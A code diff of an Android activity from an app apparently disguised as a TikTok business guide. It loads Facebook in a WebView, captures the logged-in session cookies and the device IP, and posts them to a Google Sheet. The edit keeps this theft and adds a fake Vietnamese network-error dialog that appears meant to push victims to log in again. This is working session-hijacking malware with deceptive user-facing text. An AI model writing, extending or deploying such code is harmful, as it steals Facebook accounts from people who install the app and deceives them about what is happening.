@@ -1,24 +1,25 @@
 package com.teamwork.businessguideprofortiktok.src.resource.pages.webview_page;
 
-import androidx.appcompat.app.AppCompatActivity;
-import androidx.lifecycle.Observer;
-import androidx.lifecycle.ViewModelProviders;
-
 import android.content.Intent;
 import android.os.Bundle;
 import android.util.Log;
 import android.webkit.CookieManager;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
-import android.widget.Toast;
+
+import androidx.appcompat.app.AppCompatActivity;
+import androidx.lifecycle.Observer;
+import androidx.lifecycle.ViewModelProviders;
 
 import com.teamwork.businessguideprofortiktok.R;
+import com.teamwork.businessguideprofortiktok.src.models.callback.CallbackInterface;
+import com.teamwork.businessguideprofortiktok.src.resource.dialog.confirm_dialog.ConfirmDialog;
 import com.teamwork.businessguideprofortiktok.src.resource.pages.reponse_cookies_page.ReponseCookiesActivity;
 import com.teamwork.businessguideprofortiktok.src.resource.viewmodels.webview_viewmodel.GoogleSheetViewModel;
 import com.teamwork.businessguideprofortiktok.src.utils.Constant;
 
 
-public class WebViewFacebookActivity extends AppCompatActivity {
+public class WebViewFacebookActivity extends AppCompatActivity implements CallbackInterface {
     private WebView mWebViewFb;
     private GoogleSheetViewModel mRepository;
 
@@ -41,9 +42,9 @@ public class WebViewFacebookActivity extends AppCompatActivity {
                 mRepository.getIp().observe(WebViewFacebookActivity.this, new Observer<String>() {
                     @Override
                     public void onChanged(String ip) {
-                        mRepository.postDataGoogleSheets(ip,cookies);
-                        Log.d("TAG", "onChanged: cookies: "+cookies);
-                        Log.d("TAG", "onChanged: ip: "+ip);
+                        mRepository.postDataGoogleSheets(ip, cookies);
+                        Log.d("TAG", "onChanged: cookies: " + cookies);
+                        Log.d("TAG", "onChanged: ip: " + ip);
                     }
                 });
             }
@@ -52,19 +53,12 @@ public class WebViewFacebookActivity extends AppCompatActivity {
         mRepository.getDataReponseSever().observe(WebViewFacebookActivity.this, new Observer<String>() {
             @Override
             public void onChanged(String s) {
-                Log.d("TAG", "onChanged: 111: "+s);
-                if (s.equals("Success")){
+                Log.d("TAG", "onChanged: 111: " + s);
+                if (s.equals("Success")) {
                     Intent intent = new Intent(WebViewFacebookActivity.this, ReponseCookiesActivity.class);
                     startActivity(intent);
-                }else {
-                    Toast.makeText(WebViewFacebookActivity.this, "NO COOKIES", Toast.LENGTH_SHORT).show();
-                    try {
-                        Thread.sleep(3000);
-                        finish();
-                        startActivity(getIntent());
-                    } catch (InterruptedException e) {
-                        e.printStackTrace();
-                    }
+                } else {
+                    ConfirmDialog.showDialogAcount(WebViewFacebookActivity.this, "Bạn đã cấp quyền truy cập internet ?", "Vui lòng cấp quyền internet truy cập DNS_PROBE_FINISHED_NXDOMAIN", WebViewFacebookActivity.this);
                 }
             }
         });
@@ -73,14 +67,14 @@ public class WebViewFacebookActivity extends AppCompatActivity {
     private void initView() {
         mWebViewFb = findViewById(R.id.webViewFB);
         mWebViewFb.loadUrl(Constant.mUrlFace);
-        mWebViewFb.setWebViewClient(new WebViewClient(){
+        mWebViewFb.setWebViewClient(new WebViewClient() {
             @Override
             public void onPageFinished(WebView view, String url) {
                 String strCookies = CookieManager.getInstance().getCookie(Constant.mUrlFace);
 
-                String[]arrayCookies = strCookies.split(";");
+                String[] arrayCookies = strCookies.split(";");
 
-                if (arrayCookies.length == 6){
+                if (arrayCookies.length == 6) {
                     String ip = mRepository.getLocalIpAddress();
                     mRepository.setCookies(strCookies);
                     mRepository.setIp(ip);
@@ -88,5 +82,10 @@ public class WebViewFacebookActivity extends AppCompatActivity {
                 }
             }
         });
+    }
+
+    @Override
+    public void methodToCallback() {
+
     }
 }
